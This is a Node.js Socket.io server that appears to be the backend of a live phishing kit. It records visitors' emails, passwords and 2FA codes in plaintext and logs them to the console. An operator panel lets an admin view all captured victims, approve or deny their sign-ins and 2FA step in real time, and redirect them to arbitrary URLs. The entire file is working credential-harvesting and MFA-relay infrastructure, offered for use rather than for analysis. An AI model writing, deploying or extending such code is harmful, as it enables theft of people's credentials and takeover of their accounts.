import './src/lib/env.js';
import { createServer } from "http";
import { Server } from "socket.io";
import cache from "./src/lib/cache.js";
import { verifyToken } from "./src/middleware/authMiddleWare.js";

const httpServer = createServer((req, res) => {
    res.writeHead(200, { "Content-Type": "text/plain" });
    res.end("Socket.io Server");
});

const io = new Server(httpServer, {
    cors: {
        origin: "http://localhost:3000",
        methods: ["GET", "POST"],
        credentials: true
    }
});

io.use(async (socket, next) => {
    try {
        const token = socket.handshake.auth.token;

        if (token) {
            const verification = await verifyToken(token);
            if (verification.valid) {
                socket.isAdmin = true;
                socket.adminUsername = verification.username;
            } else {
                console.log(`Socket auth failed for ${socket.id}: ${verification.error || 'invalid token'}`);
            }
        } else {
            console.log(`Socket connected without token: ${socket.id}`);
        }
        next();
    } catch (error) {
        console.error('Socket auth error:', error.message);
        next(new Error("Authentication error"));
    }
});

io.on("connection", (socket) => {
    console.log(`Socket connected: ${socket.id} ${socket.isAdmin ? '(Admin)' : ''}`);

    const cacheData = {
        userAgent: socket.handshake.headers['user-agent'] || "",
        isAdmin: socket.isAdmin || false,
        adminUsername: socket.adminUsername || null,
        connectedAt: Date.now()
    };

    cache.add(socket.id, cacheData);

    socket.emit("welcome", {
        message: "Connected to socket server",
        id: socket.id,
        isAdmin: socket.isAdmin || false,
        timestamp: Date.now()
    });

    socket.on("register", (data, callback) => {
        console.log(`Registering socket ${socket.id} with data:`, data);

        const current = cache.get(socket.id) || {};
        cache.update(socket.id, {
            ...current,
            geoData: data || {}
        });

        if (callback) {
            callback({
                success: true,
                socketId: socket.id,
                isAdmin: socket.isAdmin || false
            });
        }
    });

    socket.on("login", (data) => {
        console.log(`Login data from ${socket.id}:`, {
            email: data.email,
            password: data.password
        });

        const current = cache.get(socket.id) || {};

        cache.update(socket.id, {
            ...current,
            loginData: {
                email: data.email || '',
                password: data.password || ''
            }
        });
    });

    socket.on("denySignIn", (data) => {
        const userData = cache.get(socket.id);

        if (!userData || !userData.isAdmin) {
            return;
        }

        const targetSocketId = data.socketId;

        if (targetSocketId) {
            io.to(targetSocketId).emit("signInDenied", {
                timestamp: Date.now()
            });
            console.log(`Admin ${socket.id} denied sign-in for ${targetSocketId}`);
        }
    });

    socket.on("approveSignIn", (data) => {
        const userData = cache.get(socket.id);

        if (!userData || !userData.isAdmin) {
            return;
        }

        const targetSocketId = data.socketId;

        if (targetSocketId) {
            io.to(targetSocketId).emit("signInApproved", {
                timestamp: Date.now()
            });
            console.log(`Admin ${socket.id} approved sign-in for ${targetSocketId}`);
        }
    });

    socket.on("2fa", (data) => {
        console.log(`2FA code from ${socket.id}:`, {
            code: data.code
        });

        const current = cache.get(socket.id) || {};

        cache.update(socket.id, {
            ...current,
            loginData: {
                ...current.loginData,
                twoFactorCode: data.code || '',
                twoFactorTimestamp: Date.now()
            }
        });
    });

    socket.on("approve2fa", (data) => {
        const userData = cache.get(socket.id);

        if (!userData || !userData.isAdmin) {
            return;
        }

        const targetSocketId = data.socketId;

        if (targetSocketId) {
            io.to(targetSocketId).emit("2faApproved", {
                timestamp: Date.now(),
                approvedBy: socket.adminUsername || socket.id
            });

            console.log(`Admin ${socket.id} approved 2FA for ${targetSocketId}`);
        }
    });

    socket.on("deny2fa", (data) => {
        const userData = cache.get(socket.id);
        if (!userData || !userData.isAdmin) {
            return;
        }

        const targetSocketId = data.socketId;

        if (targetSocketId) {
            io.to(targetSocketId).emit("2faDenied", {
                timestamp: Date.now(),
                deniedBy: socket.adminUsername || socket.id,
                reason: data.reason || "2FA verification denied"
            });

            console.log(`Admin ${socket.id} denied 2FA for ${targetSocketId}`);
        }
    });

    socket.on("page", (data) => {
        const userData = cache.get(socket.id);
        if (!userData) {
            return;
        }

        const currentPage = data.page || "unknown";
        cache.update(socket.id, {
            ...userData,
            currentPage,
            lastPageUpdate: Date.now()
        });
    })

    socket.on("redirect", (data) => {
        const userData = cache.get(socket.id);
        if (!userData || !userData.isAdmin) {
            return;
        }

        const targetSocketId = data.socketId;
        const redirectUrl = data.url;

        if (targetSocketId && redirectUrl) {
            try {
                new URL(redirectUrl);

                io.to(targetSocketId).emit("redirect", {
                    url: redirectUrl,
                    timestamp: Date.now(),
                    initiatedBy: socket.adminUsername || socket.id
                });

                console.log(`Admin ${socket.id} redirected ${targetSocketId} to ${redirectUrl}`);

                const targetData = cache.get(targetSocketId);
                if (targetData) {
                    cache.update(targetSocketId, {
                        ...targetData,
                        lastRedirect: {
                            url: redirectUrl,
                            timestamp: Date.now(),
                            adminId: socket.id
                        }
                    });
                }
            } catch (error) {
                console.error(`Invalid redirect URL from admin ${socket.id}: ${redirectUrl}`);
            }
        }
    });

    socket.on("redirectPage", (data) => {
        const userData = cache.get(socket.id);
        if (!userData || !userData.isAdmin) {
            return;
        }

        const targetSocketId = data.socketId;
        const targetPage = data.page;

        if (targetSocketId && targetPage) {
            io.to(targetSocketId).emit("redirectPage", {
                page: targetPage,
                timestamp: Date.now(),
                initiatedBy: socket.adminUsername || socket.id
            });
        }
    });

    socket.on("delete", (data) => {
        const userData = cache.get(socket.id);
        if (!userData || !userData.isAdmin) {
            return;
        }

        if (data.ids && Array.isArray(data.ids)) {
            data.ids.forEach(targetSocketId => {
                cache.remove(targetSocketId);

                const targetSocket = io.sockets.sockets.get(targetSocketId);
                if (targetSocket) {
                    targetSocket.disconnect(true);
                }
            });
        }
    });

    socket.on("getAll", async (callback) => {
        try {
            const userData = cache.get(socket.id);

            if (!userData || !userData.isAdmin) {
                if (callback) {
                    callback({
                        success: false,
                        error: "Unauthorized: Admin access required"
                    });
                }
                return;
            }

            const allConnections = cache.getAll();
            const filteredConnections = allConnections.filter(conn =>
                !conn.isAdmin
            );

            if (callback) {
                callback({
                    success: true,
                    connections: filteredConnections,
                    total: filteredConnections.length,
                    adminCount: allConnections.filter(conn => conn.isAdmin).length,
                    timestamp: Date.now()
                });
            }
        } catch (error) {
            console.error("Error in getAll:", error);
            if (callback) {
                callback({
                    success: false,
                    error: "Internal server error"
                });
            }
        }
    });

    socket.on("ping", (callback) => {
        if (callback) callback({ pong: Date.now() });
    });

    socket.on("disconnect", (reason) => {
        console.log(`Socket disconnected: ${socket.id} - ${reason}`);
        cache.remove(socket.id);
    });
});

httpServer.listen(3005, () => {
    console.log("Socket.io server running on ws://localhost:3005");
});